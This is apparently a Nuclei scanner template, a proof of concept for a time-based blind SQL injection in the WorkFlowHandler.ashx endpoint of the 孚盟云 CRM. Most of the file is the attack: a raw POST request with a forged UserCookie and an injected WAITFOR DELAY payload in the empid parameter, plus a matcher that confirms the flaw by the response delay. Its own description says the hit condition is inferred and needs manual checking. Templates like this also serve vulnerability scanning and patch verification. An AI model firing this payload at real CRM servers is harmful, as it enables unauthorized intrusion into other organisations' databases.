id: poc-gawgil9vms3w7a66
info:
  name: 孚盟云CRM WorkFlowHandler.ashx 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2026
http:
- raw:
  - 'POST /m/Dingding/Ajax/WorkFlowHandler.ashx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0

    Cookie: UserCookie={"empId":"1","corpId": "1"}

    Content-Type: application/x-www-form-urlencoded


    action=GetProcessOverCount&empid=admin'')))WAITFOR DELAY''0:0:5''-- -'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
